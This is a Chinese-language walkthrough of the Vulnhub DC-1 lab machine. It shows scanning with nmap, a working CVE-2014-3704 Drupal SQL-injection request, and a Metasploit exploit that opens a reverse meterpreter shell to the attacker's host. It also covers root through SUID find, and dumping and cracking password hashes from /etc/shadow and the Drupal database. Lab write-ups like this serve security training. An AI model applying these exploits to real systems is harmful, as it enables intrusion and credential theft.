---
title: Vulnhub-DC-1
published: 2025-03-09 16:17:52
tags: [Vulnhub]
category: 靶机
draft: false
---

# DC-1

> https://www.vulnhub.com/entry/dc-1,292/
> 

## 主机发现端口扫描

1. 使用nmap扫描网段类存活主机
    
    因为靶机是我最后添加的，所以靶机IP是`156`
    
    ```php
    nmap -sP 192.168.75.0/24     
    //            
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-28 12:48 CST
    Nmap scan report for 192.168.75.1
    Host is up (0.00012s latency).
    MAC Address: 00:50:56:C0:00:08 (VMware)
    Nmap scan report for 192.168.75.2
    Host is up (0.00012s latency).
    MAC Address: 00:50:56:FB:CA:45 (VMware)
    Nmap scan report for 192.168.75.156
    Host is up (0.00088s latency).
    MAC Address: 00:0C:29:47:FC:83 (VMware)
    Nmap scan report for 192.168.75.254
    Host is up (0.00042s latency).
    MAC Address: 00:50:56:FB:E7:F4 (VMware)
    Nmap scan report for 192.168.75.151
    Host is up.
    ```
    
2. 扫描主机开放端口
    
    ```php
    nmap -sT -min-rate 10000 -p- 192.168.75.156
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-28 12:48 CST
    Nmap scan report for 192.168.75.156
    Host is up (0.00010s latency).
    Not shown: 65531 closed tcp ports (conn-refused)
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    111/tcp   open  rpcbind
    39179/tcp open  unknown
    MAC Address: 00:0C:29:47:FC:83 (VMware)
    ```
    
3. 扫描主机服务版本以及系统版本
    
    ```php
    nmap -sT -sV -O -p22,80,111,39179 192.168.75.156
    //
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-28 12:49 CST
    Nmap scan report for 192.168.75.156
    Host is up (0.00054s latency).
    
    PORT      STATE SERVICE VERSION
    22/tcp    open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
    80/tcp    open  http    Apache httpd 2.2.22 ((Debian))
    111/tcp   open  rpcbind 2-4 (RPC #100000)
    39179/tcp open  status  1 (RPC #100024)
    MAC Address: 00:0C:29:47:FC:83 (VMware)
    Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
    Device type: general purpose
    Running: Linux 3.X
    OS CPE: cpe:/o:linux:linux_kernel:3
    OS details: Linux 3.2 - 3.16
    Network Distance: 1 hop
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    ```
    
4. 扫描漏洞
    
    ```sql
    nmap -script=vuln -p22,80,111,39179 192.168.75.156
    Starting Nmap 7.93 ( https://nmap.org ) at 2024-09-28 12:54 CST
    Nmap scan report for 192.168.75.156
    Host is up (0.00053s latency).
    
    PORT      STATE SERVICE
    22/tcp    open  ssh
    80/tcp    open  http
    | http-csrf: 
    | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.75.156
    |   Found the following possible CSRF vulnerabilities: 
    |     
    |     Path: http://192.168.75.156:80/
    |     Form id: user-login-form
    |     Form action: /node?destination=node
    |     
    |     Path: http://192.168.75.156:80/user/password
    |     Form id: user-pass
    |     Form action: /user/password
    |     
    |     Path: http://192.168.75.156:80/node?destination=node
    |     Form id: user-login-form
    |     Form action: /node?destination=node
    |     
    |     Path: http://192.168.75.156:80/user/register
    |     Form id: user-register-form
    |     Form action: /user/register
    |     
    |     Path: http://192.168.75.156:80/user
    |     Form id: user-login
    |     Form action: /user
    |     
    |     Path: http://192.168.75.156:80/user/
    |     Form id: user-login
    |_    Form action: /user/
    | http-vuln-cve2014-3704: 
    |   VULNERABLE:
    |   Drupal - pre Auth SQL Injection Vulnerability
    |     State: VULNERABLE (Exploitable)
    |     IDs:  CVE:CVE-2014-3704
    |         The expandArguments function in the database abstraction API in
    |         Drupal core 7.x before 7.32 does not properly construct prepared
    |         statements, which allows remote attackers to conduct SQL injection
    |         attacks via an array containing crafted keys.
    |           
    |     Disclosure date: 2014-10-15
    |     References:
    |       http://www.securityfocus.com/bid/70595
    |       https://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html
    |       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3704
    |_      https://www.drupal.org/SA-CORE-2014-005
    |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
    | http-enum: 
    |   /rss.xml: RSS or Atom feed
    |   /robots.txt: Robots file
    |   /UPGRADE.txt: Drupal file
    |   /INSTALL.txt: Drupal file
    |   /INSTALL.mysql.txt: Drupal file
    |   /INSTALL.pgsql.txt: Drupal file
    |   /: Drupal version 7 
    |   /README: Interesting, a readme.
    |   /README.txt: Interesting, a readme.
    |   /0/: Potentially interesting folder
    |_  /user/: Potentially interesting folder
    |_http-dombased-xss: Couldn't find any DOM based XSS.
    111/tcp   open  rpcbind
    39179/tcp open  unknown
    MAC Address: 00:0C:29:47:FC:83 (VMware)
    ```
    
    疑似`sql`注入和`CSRF`，以及一些让人感兴趣的目录
    

## web渗透

1. 主页面有三个链接，`login` `new account` `req new password`
    
    ![image.png](image%2022.png)
    
2. 访问让人感兴趣的目录
    - robots.txt 列出了很多的目录
        
        ```
        User-agent: *
        Crawl-delay: 10
        # Directories
        Disallow: /includes/
        Disallow: /misc/
        Disallow: /modules/
        Disallow: /profiles/
        Disallow: /scripts/
        Disallow: /themes/
        # Files
        Disallow: /CHANGELOG.txt
        Disallow: /cron.php
        Disallow: /INSTALL.mysql.txt
        Disallow: /INSTALL.pgsql.txt
        Disallow: /INSTALL.sqlite.txt
        Disallow: /install.php
        Disallow: /INSTALL.txt
        Disallow: /LICENSE.txt
        Disallow: /MAINTAINERS.txt
        Disallow: /update.php
        Disallow: /UPGRADE.txt
        Disallow: /xmlrpc.php
        # Paths (clean URLs)
        Disallow: /admin/
        Disallow: /comment/reply/
        Disallow: /filter/tips/
        Disallow: /node/add/
        Disallow: /search/
        Disallow: /user/register/
        Disallow: /user/password/
        Disallow: /user/login/
        Disallow: /user/logout/
        # Paths (no clean URLs)
        Disallow: /?q=admin/
        Disallow: /?q=comment/reply/
        Disallow: /?q=filter/tips/
        Disallow: /?q=node/add/
        Disallow: /?q=search/
        Disallow: /?q=user/password/
        Disallow: /?q=user/register/
        Disallow: /?q=user/login/
        Disallow: /?q=user/logout/
        ```
        
3. 已知CMS是`Drupal 7` `PHP 5.4.45` `Apache 2.2.22`
    
    `Drupal` 版本可以在`install.php` 找到，打开F12可以找到 `Drupal 7 (http://drupal.org)`
    
    晚上查阅漏洞
    
    - [CVE-2014-3704 Drupal SQL注入漏洞](https://blog.csdn.net/smli_ng/article/details/115496447) ，SQL注入，尝试爆出数据
        
        直接放在`bp`的重放器使用
        
        ```sql
        POST /?q=node&destination=node HTTP/1.1
        Host: 192.168.75.156
        Accept-Encoding: gzip, deflate
        Accept: */*
        Accept-Language: en
        User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
        Connection: close
        Content-Type: application/x-www-form-urlencoded
        Content-Length: 126
        
        pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,database()),0)%23]=bob&name[0]=a
        ```
        
        ```sql
        用户: dbuser@localhost
        当前库： drupaldb
        版本： mysql 5.5.60-0+deb7u1
        ```
        
        尝试了联合语句好像太长了，无法使用漏洞，我们丢给`sqlmap`尝试
        
        `drupaldb`没查到任何数据
        
    - 使用MSF搜索漏洞
        
        ```sql
        msf6 > search Drupal
        
        Matching Modules
        ================
        
           #  Name                                           Disclosure Date  Rank       Check  Description
           -  ----                                           ---------------  ----       -----  -----------
           0  exploit/unix/webapp/drupal_coder_exec          2016-07-13       excellent  Yes    Drupal CODER Module Remote Command Execution
           1  exploit/unix/webapp/drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection
           2  exploit/multi/http/drupal_drupageddon          2014-10-15       excellent  No     Drupal HTTP Parameter Key/Value SQL Injection
           3  auxiliary/gather/drupal_openid_xxe             2012-10-17       normal     Yes    Drupal OpenID External Entity Injection
           4  exploit/unix/webapp/drupal_restws_exec         2016-07-13       excellent  Yes    Drupal RESTWS Module Remote PHP Code Execution
           5  exploit/unix/webapp/drupal_restws_unserialize  2019-02-20       normal     Yes    Drupal RESTful Web Services unserialize() RCE
           6  auxiliary/scanner/http/drupal_views_user_enum  2010-07-02       normal     Yes    Drupal Views Module Users Enumeration
           7  exploit/unix/webapp/php_xmlrpc_eval            2005-06-29       excellent  Yes    PHP XML-RPC Arbitrary Code Execution
        ```
        
        使用第三个，`Drupal HTTP Parameter Key/Value SQL Injection`
        
        ```sql
        msf6 > use exploit/multi/http/drupal_drupageddon 
        [*] No payload configured, defaulting to php/meterpreter/reverse_tcp
        msf6 exploit(multi/http/drupal_drupageddon) > show options
        msf6 exploit(multi/http/drupal_drupageddon) > set rhosts 192.168.75.156
        msf6 exploit(multi/http/drupal_drupageddon) > exploit
        [*] Started reverse TCP handler on 192.168.75.151:4444 
        [*] Sending stage (39927 bytes) to 192.168.75.156
        [*] Meterpreter session 1 opened (192.168.75.151:4444 -> 192.168.75.156:43212) at 2024-09-28 14:32:44 +0800
        
        meterpreter > 
        ```
        
        拿到shell
        

## 提权

1. 查看权限
    
    ```sql
    www-data@DC-1:/var/www$ whoami
    www-data
    //
    www-data@DC-1:/var/www$ uname -a
    Linux DC-1 3.2.0-6-486 #1 Debian 3.2.102-1 i686 GNU/Linux
    //
    www-data@DC-1:/var/www$ id
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    //
    www-data@DC-1:/var/www$ sudo -l
    bash: sudo: command not found
    //
    www-data@DC-1:/var/www$ find / -perm -u=s -type f 2>/dev/null
    /bin/mount
    /bin/ping
    /bin/su
    /bin/ping6
    /bin/umount
    /usr/bin/at
    /usr/bin/chsh
    /usr/bin/passwd
    /usr/bin/newgrp
    /usr/bin/chfn
    /usr/bin/gpasswd
    /usr/bin/procmail
    /usr/bin/find
    /usr/sbin/exim4
    /usr/lib/pt_chown
    /usr/lib/openssh/ssh-keysign
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /sbin/mount.nfs
    ```
    
2. 当前目录下存在`flag1.txt` 
    
    ```sql
    Every good CMS needs a config file - and so do you.
    ```
    
3. 因为我们查找`/var/www$ find / -perm -u=s -type f 2>/dev/null` 的时候发现了`find` 有suid权限，所以可以直接提权
    
    ```sql
    www-data@DC-1:/var/www$ find flag1.txt -exec 'whoami' \;
    root
    ```
    
    ```sql
    www-data@DC-1:/var/www$ find flag1.txt -exec '/bin/sh' \;
    find flag1.txt -exec '/bin/sh' \;
    # whoami
    whoami
    ```
    
    读取`/root`下的`thefinalflag.txt`
    
    ```sql
    Well done!!!!
    
    Hopefully you've enjoyed this and learned some new skills.
    
    You can let me know what you thought of this little journey
    by contacting me via Twitter - @DCAU7
    ```
    

## flag

- `flag1`,在获得shell的时候当前目录下
- `flag2`
    
    尝试寻找Drupal的数据库配置文件 **`Sites/default/settings.php` ，**`flag2` 就在里面
    
    ```sql
    # cat /var/www/sites/default/settings.php
    //
    <?php
    
    /**
     *
     * flag2
     * Brute force and dictionary attacks aren't the
     * only ways to gain access (and you WILL need access).
     * What can you do with these credentials?
     *
     */
    
    $databases = array (
      'default' => 
      array (
        'default' => 
        array (
          'database' => 'drupaldb',
          'username' => 'dbuser',
          'password' => 'R0ck3t',
          'host' => 'localhost',
          'port' => '',
          'driver' => 'mysql',
          'prefix' => '',
        ),
      ),
    );
    ```
    
- `flag3`
    
    登录`mysql`数据库看看是否存在`flag`
    
    ```sql
    mysql> show databases;
    +--------------------+
    | Database           |
    +--------------------+
    | information_schema |
    | drupaldb           |
    +--------------------+
    //
    mysql> show tables;
    +-----------------------------+
    | Tables_in_drupaldb          |
    +-----------------------------+
    | actions                     |
    | authmap                     |
    | batch                       |
    | block                       |
    | block_custom                |
    | block_node_type             |
    | block_role                  |
    | blocked_ips                 |
    | cache                       |
    | cache_block                 |
    | cache_bootstrap             |
    | cache_field                 |
    | cache_filter                |
    | cache_form                  |
    | cache_image                 |
    | cache_menu                  |
    | cache_page                  |
    | cache_path                  |
    | cache_update                |
    | cache_views                 |
    | cache_views_data            |
    | comment                     |
    | ctools_css_cache            |
    | ctools_object_cache         |
    | date_format_locale          |
    | date_format_type            |
    | date_formats                |
    | field_config                |
    | field_config_instance       |
    | field_data_body             |
    | field_data_comment_body     |
    | field_data_field_image      |
    | field_data_field_tags       |
    | field_revision_body         |
    | field_revision_comment_body |
    | field_revision_field_image  |
    | field_revision_field_tags   |
    | file_managed                |
    | file_usage                  |
    | filter                      |
    | filter_format               |
    | flood                       |
    | history                     |
    | image_effects               |
    | image_styles                |
    | menu_custom                 |
    | menu_links                  |
    | menu_router                 |
    | node                        |
    | node_access                 |
    | node_comment_statistics     |
    | node_revision               |
    | node_type                   |
    | queue                       |
    | rdf_mapping                 |
    | registry                    |
    | registry_file               |
    | role                        |
    | role_permission             |
    | search_dataset              |
    | search_index                |
    | search_node_links           |
    | search_total                |
    | semaphore                   |
    | sequences                   |
    | sessions                    |
    | shortcut_set                |
    | shortcut_set_users          |
    | system                      |
    | taxonomy_index              |
    | taxonomy_term_data          |
    | taxonomy_term_hierarchy     |
    | taxonomy_vocabulary         |
    | url_alias                   |
    | users                       |
    | users_roles                 |
    | variable                    |
    | views_display               |
    | views_view                  |
    | watchdog                    |
    +-----------------------------+
    //
    mysql> select * from users;
    +-----+--------+---------------------------------------------------------+------------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+------------------------+------+
    | uid | name   | pass                                                    | mail                   | theme | signature | signature_format | created    | access     | login      | status | timezone            | language | picture | init                   | data |
    +-----+--------+---------------------------------------------------------+------------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+------------------------+------+
    |   0 |        |                                                         |                        |       |           | NULL             |          0 |          0 |          0 |      0 | NULL                |          |       0 |                        | NULL |
    |   1 | admin  | $S$DvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR | admin@example.com      |       |           | NULL             | 1550581826 | 1550583852 | 1550582362 |      1 | Australia/Melbourne |          |       0 | admin@example.com      | b:0; |
    |   2 | Fred   | $S$DWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ/9TCGg | fred@example.org       |       |           | filtered_html    | 1550581952 | 1550582225 | 1550582225 |      1 | Australia/Melbourne |          |       0 | fred@example.org       | b:0; |
    +-----+--------+---------------------------------------------------------+------------------------+-------+-----------+------------------+------------+------------+------------+--------+---------------------+----------+---------+------------------------+------+
    ```
    
    尝试使用`john`破解`admin`的密码，`53cr3t`
    
    ```sql
    john --wordlist=/usr/share/wordlists/rockyou.txt pass 
    //
    Using default input encoding: UTF-8
    Loaded 1 password hash (Drupal7, $S$ [SHA512 256/256 AVX2 4x])
    Cost 1 (iteration count) is 32768 for all loaded hashes
    Will run 8 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    53cr3t           (?)     
    1g 0:00:22:32 DONE (2024-09-28 16:03) 0.000739g/s 1657p/s 1657c/s 1657C/s 53cr3t5..539831
    Use the "--show" option to display all of the cracked passwords reliably
    ```
    
    还有一种方法：网上查阅在网站目录的 `scripts`目录里面有个用于生成密码的`password-hash.php`文件
    
    ```sql
    // 生成 ilovesunset 的密码hash
    php password-hash.php 'ilovesunset' > 1.txt
    ```
    
    然后数据库里将密码覆盖上去即可
    
    拿到密码`53cr3t`后，登录
    
    ![image.png](image%2023.png)
    
    点击`find content` ,存在`flag3` ，内容是
    
    ```sql
    flag3 
    Special PERMS will help FIND the passwd - but you'll need to -exec that command to work out how to get what's in the shadow.
    ```
    
- `flag4`
    
    根据提示，`flag4`应该在`/etc/shadows`
    
    ```sql
    # cat /etc/shadow
    //
    root:$6$rhe3rFqk$NwHzwJ4H7abOFOM67.Avwl3j8c05rDVPqTIvWg8k3yWe99pivz/96.K7IqPlbBCmzpokVmn13ZhVyQGrQ4phd/:17955:0:99999:7:::
    daemon:*:17946:0:99999:7:::
    bin:*:17946:0:99999:7:::
    sys:*:17946:0:99999:7:::
    sync:*:17946:0:99999:7:::
    games:*:17946:0:99999:7:::
    man:*:17946:0:99999:7:::
    lp:*:17946:0:99999:7:::
    mail:*:17946:0:99999:7:::
    news:*:17946:0:99999:7:::
    uucp:*:17946:0:99999:7:::
    proxy:*:17946:0:99999:7:::
    www-data:*:17946:0:99999:7:::
    backup:*:17946:0:99999:7:::
    list:*:17946:0:99999:7:::
    irc:*:17946:0:99999:7:::
    gnats:*:17946:0:99999:7:::
    nobody:*:17946:0:99999:7:::
    libuuid:!:17946:0:99999:7:::
    Debian-exim:!:17946:0:99999:7:::
    statd:*:17946:0:99999:7:::
    messagebus:*:17946:0:99999:7:::
    sshd:*:17946:0:99999:7:::
    mysql:!:17946:0:99999:7:::
    flag4:$6$Nk47pS8q$vTXHYXBFqOoZERNGFThbnZfi5LN0ucGZe05VMtMuIFyqYzY/eVbPNMZ7lpfRVc0BYrQ0brAhJoEzoEWCKxVW80:17946:0:99999:7:::
    ```
    
    将`flag4`那行保存为`flag4`再使用`john`破解，的到密码`orange`
    
    ```sql
    john --wordlist=/usr/share/wordlists/rockyou.txt flag4                                                                                             
    Using default input encoding: UTF-8
    Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
    Cost 1 (iteration count) is 5000 for all loaded hashes
    Will run 8 OpenMP threads
    Press 'q' or Ctrl-C to abort, almost any other key for status
    orange           (flag4)     
    1g 0:00:00:00 DONE (2024-09-28 16:23) 12.50g/s 12800p/s 12800c/s 12800C/s 123456..bethany
    Use the "--show" option to display all of the cracked passwords reliably
    Session completed.
    ```
    
    使用`ssh`登录
    
    然后读取加目录下的`flag4.txt`
    
    ```sql
    Can you use this same method to find or access the flag in root?
    
    Probably. But perhaps it's not that easy.  Or maybe it is?
    ```